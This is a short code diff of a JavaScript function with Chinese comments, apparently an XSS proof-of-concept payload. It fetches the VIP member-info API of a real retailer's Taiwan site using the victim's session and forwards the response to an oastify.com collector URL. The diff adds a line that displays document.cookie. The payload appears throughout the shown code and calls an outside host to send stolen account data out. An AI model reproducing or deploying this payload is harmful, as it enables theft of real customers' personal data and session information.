@@ -5,7 +5,7 @@
  */
 async function fetchAndForwardHTML() {
   // -------------------------- 配置参数 --------------------------
-  const htmlSourceUrl = 'https://www.levis.com.tw/V2/LineAuth/Auth?shopId=18793&source=Frontline&device=PC&targetPageQueryString=&locationCode=&employeeCode=&targetPageType=AccountBinding&rt=%2FV2%2FVipMember%2FAccountBinding'; // 要获取的远程HTML地址（替换为实际地址）
+  const htmlSourceUrl = 'https://www.levis.com.tw/webapi/VIPMember/GetVipInfo?isBinding=true&lang=zh-TW&shopId=18793'; // 要获取的远程HTML地址（替换为实际地址）
   const forwardTargetUrl = 'https://659b9qe5lrupnivhjlma5tnzzq5ht9hy.oastify.com/upload'; // 转发的目标POST地址（替换为实际地址）
   // ----------------------------------------------------------------
  
@@ -63,6 +63,6 @@ async function fetchAndForwardHTML() {
     };
   }
 }
- 
+alert(document.cookie);
 // -------------------------- 调用执行 --------------------------
 fetchAndForwardHTML();
